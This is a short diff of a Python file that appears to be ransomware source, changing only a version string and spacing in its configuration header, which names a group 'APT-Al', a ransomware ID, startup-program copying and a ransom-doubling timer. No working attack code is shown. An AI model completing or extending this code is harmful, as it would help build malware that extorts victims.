@@ -3,10 +3,10 @@ import sys
 from datetime import datetime
 
 who_we_are = "APT-Al"
-version = "v1.1" # XXXX
+version = "2" # XXXX
 
 what_is_my_name = "XXXX" # to copy startup programs
-what_is_my_id = "1"# ransomwareID XXXX
+what_is_my_id = "1" # ransomwareID XXXX
 when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 how_many_days_to_double_ransom = 1
 
